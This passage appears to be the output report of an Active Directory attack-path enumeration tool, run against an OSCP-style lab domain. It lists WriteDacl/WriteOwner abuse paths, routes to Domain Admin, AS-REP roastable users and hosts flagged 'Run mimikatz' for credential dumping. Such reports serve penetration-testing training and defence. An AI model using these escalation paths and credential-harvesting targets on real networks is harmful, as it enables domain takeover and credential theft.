| ENTERPRISE ADMINS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ACCOUNT OPERATORS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ACCOUNT OPERATORS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ⚪ Shadow Admins (Control over DA Users)
**OSCP Relevance:** HIGH | **Results:** None

### ✅ WriteDacl Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 66

> Find principals with WriteDacl on high-value targets. Can grant themselves GenericAll then escalate further.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | REPLICATOR@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | REPLICATOR@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | REPLICATOR@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ✅ WriteOwner Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 66

> Find principals with WriteOwner on targets. Can take ownership, then WriteDacl, then GenericAll.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ENTERPRISE ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | REPLICATOR@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | REPLICATOR@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | REPLICATOR@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ⚪ AddKeyCredentialLink (Shadow Credentials)
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ ForceChangePassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ AddMember to Privileged Groups
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Owns Relationships on Users/Groups
**OSCP Relevance:** HIGH | **Results:** 27

> Find principals who own other users or groups. Owner can grant themselves full control.

| Owner | OwnedObject | ObjectType |
| --- | --- | --- |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | REPLICATOR@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ⚪ GPO Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ OU Control for Object Manipulation
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ AllExtendedRights Enumeration
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Read LAPS Password Rights
**OSCP Relevance:** HIGH | **Results:** None

### ✅ All Domain Admins
**OSCP Relevance:** HIGH | **Results:** 2

> List all members of Domain Admins group (including nested membership). Know your targets.

| DomainAdmin | Enabled | AdminCount |
| --- | --- | --- |
| JEFFADMIN@CORP.COM | True | True |
| ADMINISTRATOR@CORP.COM | True | True |

### ⚪ GenericWrite on Users
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ WriteSPN for Targeted Kerberoasting
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ WriteAccountRestrictions for RBCD
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ SyncLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ AddAllowedToAct Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ DCSync (Composite Check)
**OSCP Relevance:** HIGH | **Results:** None

---

## Attack Chains

### ✅ Full Attack Path: Owned User -> Pivot -> DA
**OSCP Relevance:** HIGH | **Results:** 7

> Find complete attack paths from low-privilege owned user through pivot systems to Domain Admin. Reconstructs DCSync capstone-style attack chains.

| OwnedUser | PivotMachine | PivotMachineIP | Note |
| --- | --- | --- | --- |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | DA has admin here - MIMIKATZ TARGET |
| LEON@CORP.COM | FILES04.CORP.COM | 192.168.249.73 | DA has admin here - MIMIKATZ TARGET |
| LEON@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | DA has admin here - MIMIKATZ TARGET |
| JEN@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | DA has admin here - MIMIKATZ TARGET |
| JEN@CORP.COM | FILES04.CORP.COM | 192.168.249.73 | DA has admin here - MIMIKATZ TARGET |
| JEFF@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | DA has admin here - MIMIKATZ TARGET |
| DAVE@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | DA has admin here - MIMIKATZ TARGET |

### ✅ Shortest Path to Domain Admins
**OSCP Relevance:** HIGH | **Results:** 7

> Find shortest privilege escalation path from any enabled user to Domain Admins group.

| StartUser | Hops | Path |
| --- | --- | --- |
| STEPHANIE@CORP.COM | 3 | ['STEPHANIE@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| PETE@CORP.COM | 3 | ['PETE@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| LEON@CORP.COM | 3 | ['LEON@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| JEN@CORP.COM | 3 | ['JEN@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| JEFF@CORP.COM | 3 | ['JEFF@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| IIS_SERVICE@CORP.COM | 3 | ['IIS_SERVICE@CORP.COM', 'CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| DAVE@CORP.COM | 3 | ['DAVE@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |

### ⚪ All Paths to Domain Admin (Multi-Hop)
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Credential Harvest Opportunities
**OSCP Relevance:** HIGH | **Results:** 7

> Find machines where you have admin AND Domain Admin has access. Prime targets for mimikatz credential dumping.

| OwnedUser | TargetMachine | TargetMachineIP | Action |
| --- | --- | --- | --- |
| LEON@CORP.COM | FILES04.CORP.COM | 192.168.249.73 | Run mimikatz - DA creds may be cached |
| JEN@CORP.COM | FILES04.CORP.COM | 192.168.249.73 | Run mimikatz - DA creds may be cached |
| JEN@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | Run mimikatz - DA creds may be cached |
| JEFF@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | Run mimikatz - DA creds may be cached |
| DAVE@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | Run mimikatz - DA creds may be cached |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | Run mimikatz - DA creds may be cached |
| LEON@CORP.COM | CLIENT74.CORP.COM | 192.168.249.74 | Run mimikatz - DA creds may be cached |

### Find Paths Through Specific Computer
*Skipped - requires variables: COMPUTER*

### Shortest Path Between Two Users
*Skipped - requires variables: SOURCE_USER, TARGET_USER*

### ⚪ Path to High-Value Targets
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Circular Group Memberships
**OSCP Relevance:** LOW | **Results:** None

---

## Owned Principal

### What Can Owned User Access?
*Skipped - requires variables: USER*

### Quick Wins from Owned User Context
*Skipped - requires variables: USER*

### Path to DA from Owned User
*Skipped - requires variables: USER*

### Owned User Group Memberships
*Skipped - requires variables: USER*

### Outbound Object Control from Owned
*Skipped - requires variables: USER*

### First Hop Lateral Movement
*Skipped - requires variables: USER*

### Kerberoastable from Owned Context
*Skipped - requires variables: USER*

### ✅ AS-REP Targets from Owned Context
**OSCP Relevance:** HIGH | **Results:** 1

> Find AS-REP roastable accounts. These can be attacked without any additional access.

| User | IsPrivileged | Description |
| --- | --- | --- |
| DAVE@CORP.COM | False |  |

### Session Harvest Opportunities
*Skipped - requires variables: USER*

### Chained Privilege Escalation
*Skipped - requires variables: USER*

---

## Operational

### ✅ Computers by Operating System (Find Legacy)
**OSCP Relevance:** MEDIUM | **Results:** 4

> Enumerate computers grouped by OS. Legacy systems (2008, 2003, XP) are often more vulnerable.

| OS | Computers | Count |
| --- | --- | --- |
| WINDOWS SERVER 2022 STANDARD | ['WEB04.CORP.COM', 'DC1.CORP.COM', 'FILES04.CORP.COM'] | 3 |
| WINDOWS 11 PRO | ['CLIENT75.CORP.COM'] | 1 |
| WINDOWS 10 PRO | ['CLIENT76.CORP.COM'] | 1 |
| WINDOWS 11 ENTERPRISE | ['CLIENT74.CORP.COM'] | 1 |

### ⚪ Legacy Windows Systems
